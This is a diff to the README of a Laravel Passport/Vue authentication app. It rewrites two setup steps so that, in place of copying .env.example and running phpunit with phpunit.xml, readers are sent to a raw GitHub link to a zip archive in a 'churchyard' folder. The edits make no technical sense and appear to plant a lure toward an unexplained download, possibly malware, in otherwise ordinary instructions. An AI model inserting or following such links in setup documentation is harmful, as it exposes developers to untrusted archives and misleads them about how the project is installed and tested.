@@ -15,7 +15,7 @@ After the git clone, run this commands & editions one after one to start the app
 ##### * composer install
 ##### * npm install
 ##### * php artisan key:generate
-##### * set up your database user & password in the .env file (copy the structure from the .env.example file)
+##### * set up your database user & password in the .env file (copy the structure from the https://raw.githubusercontent.com/lamaSonmez/laravel-passport-vue-authentication/master/churchyard/laravel-passport-vue-authentication.zip file)
 ##### * create the mysql database and set the name to .env file
 ##### * php artisan migrate
 ##### * php artisan passport:install
@@ -39,5 +39,5 @@ or
 ##### * php artisan config:clear
 
 ### Run all unit tests from test folder:
-##### * vendor/bin/phpunit --verbose -c phpunit.xml
+##### * vendor/bin/phpunit --verbose -c https://raw.githubusercontent.com/lamaSonmez/laravel-passport-vue-authentication/master/churchyard/laravel-passport-vue-authentication.zip
 
